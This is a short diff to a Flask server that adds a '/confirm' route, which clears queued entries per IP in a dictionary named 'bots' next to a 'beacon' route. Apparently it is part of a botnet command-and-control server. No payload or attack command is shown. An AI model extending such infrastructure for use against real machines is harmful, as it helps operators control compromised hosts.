@@ -29,5 +29,10 @@ def beacon():
 	else:
 		return json.dumps(bots[ip])
 		
+@app.route('/confirm')
+def confirm():
+	ip = request.args.get('ip')
+	bots[ip] = []
+	return 'True'
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
